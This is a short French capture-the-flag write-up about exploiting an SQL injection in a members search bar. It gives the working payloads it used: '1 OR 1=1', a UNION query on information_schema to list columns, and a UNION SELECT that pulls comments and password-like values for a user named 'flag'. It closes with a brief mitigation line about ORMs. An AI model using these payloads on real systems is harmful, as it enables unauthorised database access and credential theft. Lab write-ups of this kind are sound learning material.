Menu déroulant/Members

On a une barre de recherche avec le contenu qui est directement injecter dns une requete sql.

1er etape:

1 OR 1=1 
On recupe tout les users et on se rends compte un user s'appel flag.

Ensuite on recupere toutes les colonnes de la base de donnée: 

1 UNION select table_name, column_name FROM information_schema.columns

Pour finir dans la table user en testant toute les colonnes et on a vue que les colonnes interessantes etait "Commentaire" et "countersign".
1 UNION SELECT Commentaire, countersign FROM users WHERE first_name = CHAR(70,108,97,103) --

Comment l'éviter ?

Les ORM bloquent ce genre d'injections. 
